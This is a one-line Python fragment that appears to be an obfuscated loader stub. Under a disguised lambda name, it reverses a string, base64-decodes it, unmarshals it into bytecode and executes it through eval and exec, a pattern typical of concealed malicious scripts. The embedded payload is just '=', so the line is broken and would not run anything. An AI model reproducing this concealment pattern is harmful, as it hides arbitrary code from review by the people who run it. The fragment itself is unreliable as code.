_1nf3r10r_ = lambda __1nf3r10r__ : __import__('marshal').loads(__import__('base64').b64decode(__1nf3r10r__[::-1]));eval("exec((_1nf3r10r_)(b'='))")
